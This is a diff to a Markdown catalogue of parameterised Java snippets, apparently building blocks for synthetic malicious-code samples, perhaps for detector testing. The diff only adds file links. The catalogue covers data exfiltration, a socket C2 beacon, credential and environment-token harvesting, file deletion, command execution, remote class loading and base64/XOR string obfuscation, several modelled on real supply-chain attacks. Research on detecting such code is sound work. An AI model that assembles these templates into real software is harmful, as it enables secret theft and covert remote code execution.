@@ -98,6 +98,8 @@ conn.getOutputStream().write(<payload>.getBytes(java.nio.charset.StandardCharset
 conn.getResponseCode();
 ```
 
+File: [`snippets/netio/post/httpurlconnection.jsnippet`](snippets/netio/post/httpurlconnection.jsnippet)
+
 #### netio/post/httpclient
 
 Exfiltrating data with an HTTP `POST` via the `java.net.http` client (Java 11+). The
@@ -114,6 +116,8 @@ try {
 } catch (InterruptedException e) {}
 ```
 
+File: [`snippets/netio/post/httpclient.jsnippet`](snippets/netio/post/httpclient.jsnippet)
+
 #### netio/exfil/githubapi
 
 Posting harvested secrets to the GitHub REST API with a stolen token in the
@@ -129,6 +133,8 @@ conn.getOutputStream().write(<payload>.getBytes(java.nio.charset.StandardCharset
 conn.getResponseCode();
 ```
 
+File: [`snippets/netio/exfil/githubapi.jsnippet`](snippets/netio/exfil/githubapi.jsnippet)
+
 #### netio/exfil/socket
 
 Low-level C2 beacon: writing data to a raw TCP socket.
@@ -138,6 +144,8 @@ java.net.Socket socket = new java.net.Socket(<host>, <port>);
 socket.getOutputStream().write(<payload>.getBytes(java.nio.charset.StandardCharsets.UTF_8));
 socket.close();
 ```
+
+File: [`snippets/netio/exfil/socket.jsnippet`](snippets/netio/exfil/socket.jsnippet)
 
 #### netio/download/get
 
@@ -152,6 +160,8 @@ try {
 } catch (java.io.IOException e) {}
 ```
 
+File: [`snippets/netio/download/get.jsnippet`](snippets/netio/download/get.jsnippet)
+
 
 ### File system access
 
@@ -165,6 +175,8 @@ java.io.File file = new java.io.File(<filename>);
 file.delete();
 ```
 
+File: [`snippets/fsaccess/del/io.jsnippet`](snippets/fsaccess/del/io.jsnippet)
+
 #### fsaccess/del/nio
 
 Deleting a file with `java.nio`.
@@ -175,6 +187,8 @@ try {
 	java.nio.file.Files.delete(path);
 } catch (IOException e) {}
 ```
+
+File: [`snippets/fsaccess/del/nio.jsnippet`](snippets/fsaccess/del/nio.jsnippet)
 
 #### fsaccess/readsecret/io
 
@@ -193,6 +207,8 @@ try {
 } catch (java.io.IOException e) {}
 ```
 
+File: [`snippets/fsaccess/readsecret/io.jsnippet`](snippets/fsaccess/readsecret/io.jsnippet)
+
 #### fsaccess/readsecret/nio
 
 Reading a credential-bearing file with `java.nio`.
@@ -200,6 +216,8 @@ Reading a credential-bearing file with `java.nio`.
 ```java
 byte[] data = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(<secretfile>));
 ```
+
+File: [`snippets/fsaccess/readsecret/nio.jsnippet`](snippets/fsaccess/readsecret/nio.jsnippet)
 
 #### fsaccess/enum/listfiles
 
@@ -221,6 +239,8 @@ if (files != null) {
 }
 ```
 
+File: [`snippets/fsaccess/enum/listfiles.jsnippet`](snippets/fsaccess/enum/listfiles.jsnippet)
+
 
 
 ### Crypto API usage
@@ -240,6 +260,8 @@ cipher.init(javax.crypto.Cipher.DECRYPT_MODE,
 byte[] plaintext = cipher.doFinal(<ciphertext>);
 ```
 
+File: [`snippets/crypto/decrypt/chacha20.jsnippet`](snippets/crypto/decrypt/chacha20.jsnippet)
+
 #### crypto/verify/ed448
 
 Verifying an attacker-controlled signature with Ed448 (Java 15+) before acting on a
@@ -251,6 +273,8 @@ sig.initVerify(<publicKey>);
 sig.update(<message>);
 boolean ok = sig.verify(<signature>);
 ```
+
+File: [`snippets/crypto/verify/ed448.jsnippet`](snippets/crypto/verify/ed448.jsnippet)
 
 #### crypto/hash/fnv1a
 
@@ -269,6 +293,8 @@ hash ^= 6605813339339102567L;
 boolean blocked = (hash == <blocklisthash>);
 ```
 
+File: [`snippets/crypto/hash/fnv1a.jsnippet`](snippets/crypto/hash/fnv1a.jsnippet)
+
 #### crypto/hash/digest
 
 The same name-hashing idea using a JDK `MessageDigest` (e.g. `"MD5"` or `"SHA-256"`)
@@ -278,6 +304,8 @@ instead of a hand-rolled hash.
 java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
 byte[] digest = md.digest(<name>.getBytes(java.nio.charset.StandardCharsets.UTF_8));
 ```
+
+File: [`snippets/crypto/hash/digest.jsnippet`](snippets/crypto/hash/digest.jsnippet)
 
 
 ### System/Environment Reconnaissance 
@@ -293,6 +321,8 @@ e.g. `"GITHUB_TOKEN"`, `"AWS_SECRET_ACCESS_KEY"`, `"NPM_TOKEN"`).
 String value = System.getenv(<envname>);
 ```
 
+File: [`snippets/recon/env/getenv.jsnippet`](snippets/recon/env/getenv.jsnippet)
+
 #### recon/env/getenvall
 
 Enumerating the entire environment block (Shai-Hulud / TruffleHog-style bulk secret
@@ -301,6 +331,8 @@ harvesting from CI environment variables).
 ```java
 java.util.Map env = System.getenv();
 ```
+
+File: [`snippets/recon/env/getenvall.jsnippet`](snippets/recon/env/getenvall.jsnippet)
 
 #### recon/os/property
 
@@ -311,6 +343,8 @@ Fingerprinting the host via a system property — the JVM equivalent of `os.plat
 ```java
 String value = System.getProperty(<propname>);
 ```
+
+File: [`snippets/recon/os/property.jsnippet`](snippets/recon/os/property.jsnippet)
 
 #### recon/os/platformbranch
 
@@ -323,6 +357,8 @@ if (platform.contains("win")) { <winaction> }
 else if (platform.contains("mac")) { <macaction> }
 else { <nixaction> }
 ```
+
+File: [`snippets/recon/os/platformbranch.jsnippet`](snippets/recon/os/platformbranch.jsnippet)
 
 
 ### Process/Memory Manipulation
@@ -342,6 +378,8 @@ Executing a system command, mirroring the XZ backdoor passing its decrypted comm
 Process process = Runtime.getRuntime().exec(<cmd>);
 ```
 
+File: [`snippets/procmem/exec/runtime.jsnippet`](snippets/procmem/exec/runtime.jsnippet)
+
 #### procmem/exec/processbuilder
 
 Executing a system command via `ProcessBuilder`. The command array is built by index
@@ -355,6 +393,8 @@ cmd[2] = <cmd>;
 Process process = new ProcessBuilder(cmd).start();
 ```
 
+File: [`snippets/procmem/exec/processbuilder.jsnippet`](snippets/procmem/exec/processbuilder.jsnippet)
+
 #### procmem/nativeload/load
 
 Loading a native library into the JVM process — the closest JVM analogue to IFUNC-style
@@ -363,6 +403,8 @@ injection of native code into the running process.
 ```java
 System.load(<libpath>);
 ```
+
+File: [`snippets/procmem/nativeload/load.jsnippet`](snippets/procmem/nativeload/load.jsnippet)
 
 
 ### Reflection/Classloading
@@ -383,6 +425,8 @@ Class clazz = Class.forName(<classname>);
 Object instance = clazz.newInstance();
 ```
 
+File: [`snippets/reflect/load/classforname.jsnippet`](snippets/reflect/load/classforname.jsnippet)
+
 #### reflect/load/urlclassloader
 
 Loading a class from a remote or downloaded JAR — closest analogue to SUNBURST loading a
@@ -394,6 +438,8 @@ urls[0] = new java.net.URL(<jarurl>);
 java.net.URLClassLoader loader = new java.net.URLClassLoader(urls);
 Class clazz = loader.loadClass(<classname>);
 ```
+
+File: [`snippets/reflect/load/urlclassloader.jsnippet`](snippets/reflect/load/urlclassloader.jsnippet)
 
 #### reflect/load/defineclass
 
@@ -417,6 +463,8 @@ args[3] = Integer.valueOf(<bytecode>.length);
 Class clazz = (Class) define.invoke(ClassLoader.getSystemClassLoader(), args);
 ```
 
+File: [`snippets/reflect/load/defineclass.jsnippet`](snippets/reflect/load/defineclass.jsnippet)
+
 #### reflect/invoke/reflection
 
 Resolving a method by name at runtime and invoking it — the managed-runtime analogue of
@@ -428,6 +476,8 @@ parameters, allocate and index-fill `new Class[n]` (parameter types) and `new Ob
 java.lang.reflect.Method method = <obj>.getClass().getMethod(<methodname>, new Class[0]);
 Object result = method.invoke(<obj>, new Object[0]);
 ```
+
+File: [`snippets/reflect/invoke/reflection.jsnippet`](snippets/reflect/invoke/reflection.jsnippet)
 
 #### reflect/invoke/methodhandle
 
@@ -443,6 +493,8 @@ java.lang.invoke.MethodHandle handle = java.lang.invoke.MethodHandles.lookup()
 Object result = handle.bindTo(<receiver>).invokeWithArguments(new Object[0]);
 ```
 
+File: [`snippets/reflect/invoke/methodhandle.jsnippet`](snippets/reflect/invoke/methodhandle.jsnippet)
+
 #### reflect/eval/scriptengine
 
 Evaluating source code at runtime through `javax.script` — the JVM analogue of `eval()`
@@ -453,6 +505,8 @@ obfuscation snippet).
 javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName(<enginename>);
 Object result = engine.eval(<script>);
 ```
+
+File: [`snippets/reflect/eval/scriptengine.jsnippet`](snippets/reflect/eval/scriptengine.jsnippet)
 
 
 ### Obfuscation
@@ -470,6 +524,8 @@ Hiding a sensitive constant by splitting it across concatenated string literals 
 String hidden = <b64part1> + <b64part2> + <b64part3>;
 ```
 
+File: [`snippets/obfusc/strsplit/concat.jsnippet`](snippets/obfusc/strsplit/concat.jsnippet)
+
 #### obfusc/decode/base64
 
 Base64-decoding a (split) literal into a usable string.
@@ -478,6 +534,8 @@ Base64-decoding a (split) literal into a usable string.
 byte[] decoded = java.util.Base64.getDecoder().decode(<b64part1> + <b64part2>);
 String text = new String(decoded, java.nio.charset.StandardCharsets.UTF_8);
 ```
+
+File: [`snippets/obfusc/decode/base64.jsnippet`](snippets/obfusc/decode/base64.jsnippet)
 
 #### obfusc/decode/base64xor
 
@@ -492,6 +550,8 @@ for (int i = 0; i < data.length; i++) {
 String text = new String(data, java.nio.charset.StandardCharsets.UTF_8);
 ```
 
+File: [`snippets/obfusc/decode/base64xor.jsnippet`](snippets/obfusc/decode/base64xor.jsnippet)
+
 #### obfusc/decode/reversedbase64xor
 
 Reverse the string, Base64-decode it, then XOR with a key plus a constant — the exact
@@ -505,3 +565,5 @@ for (int i = 0; i < data.length; i++) {
 }
 String text = new String(data, java.nio.charset.StandardCharsets.UTF_8);
 ```
+
+File: [`snippets/obfusc/decode/reversedbase64xor.jsnippet`](snippets/obfusc/decode/reversedbase64xor.jsnippet)
